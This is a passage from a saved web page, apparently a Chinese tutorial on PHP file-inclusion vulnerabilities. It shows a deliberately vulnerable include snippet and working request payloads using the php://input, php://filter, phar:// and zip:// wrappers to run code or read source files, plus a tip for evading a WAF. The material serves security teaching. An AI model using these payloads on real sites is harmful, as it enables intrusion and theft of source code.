rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">2</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">3</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">4</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 725px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 153, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">&lt;?php</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">    $file = $_GET[</span><span style="font-size: 13px; color: rgb(153, 204, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">'file'</span><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">];</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">    </span><span style="font-size: 13px; color: rgb(204, 153, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">include</span><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;"> $file;</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 153, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">?&gt;</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">allow_url_fopen 默认为 On</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">allow_url_include 默认为 Off</span></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">若有特殊要求，会在利用条件里指出。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h2 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 20px;"><span style="font-size: 20px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">php伪协议</span></h2><h3 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 18px;"><span style="font-size: 18px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">php://input</span></h3><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">利用条件：</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><ol><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">allow_url_include = On。</span></div></li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">对allow_url_fopen不做要求。</span></div></li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div></ol><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">姿势：</span></div></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 797px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">2</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">3</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">4</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">5</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 797px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">index.php</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">?file=php://input</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">POST:</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">&lt;? phpinfo();?&gt;</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/5.png?raw=true" rel="group" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.resources/5.png" height="368" width="1044"/><br/></a></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h3 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 18px;"><span style="font-size: 18px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">php://filter</span></h3><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">利用条件：无甚</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">姿势：</span></div></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 833px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 833px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。</span></div><div><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/8.png?raw=true" rel="group" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.resources/8.png" height="164" width="1024"/><br/></a></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 978px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">2</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">3</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 978px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 153, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">&gt;&gt;&gt; </span><span style="font-size: 13px; color: rgb(204, 153, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">import</span><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;"> base64</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 153, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">&gt;&gt;&gt; </span><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">base64.b64decode(</span><span style="font-size: 13px; color: rgb(153, 204, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">"PD9waHAgDQoJJGZpbGUgPSAkX0dFVFsnZmlsZSddOw0KCWluY2x1ZGUgJGZpbGU7DQo/Pg=="</span><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">)</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 204, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">b"&lt;?php \r\n\t$file = $_GET['file'];\r\n\tinclude $file;\r\n?&gt;"</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">其他姿势：</span></div></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 898px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 898px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;"><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/9.png?raw=true" style="font-family: Lato; color: rgb(85, 85, 85);"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.resources/9.png" height="117" width="673"/></a>index.php?file=php://filter/convert.base64-encode/resource=index.php</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h3 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 18px;"><span style="font-size: 18px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">phar://</span></h3><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">利用条件：</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><ol><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">php版本大于等于php5.3.0</span></div></li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div></ol><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">姿势：</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">假设有个文件phpinfo.txt，其内容为</span><span style="font-size: 13px; background-color: rgb(45, 45, 45); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; border-top-left-radius: 3px; border-top-right-radius: 3px; padding: 2px 4px; word-wrap: break-word; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; line-height: 2;">&lt;?php phpinfo(); ?&gt;</span><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">，打包成zip压缩包，如下：</span></div><div/></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">指定绝对路径</span></div></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 868px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 868px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">或者使用相对路径（这里test.zip就在当前目录下）</span></div></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 973px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 973px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">index.php?file=phar://test.zip/phpinfo.txt</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/10.png?raw=true" rel="group" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.resources/10.png" height="301" width="1115"/><br/></a></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h3 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 18px;"><span style="font-size: 18px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">zip://</span></h3><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">利用条件：</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><ol><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">php版本大于等于php5.3.0</span></div></li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div></ol><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">姿势：</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">构造zip包的方法同phar。</span></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
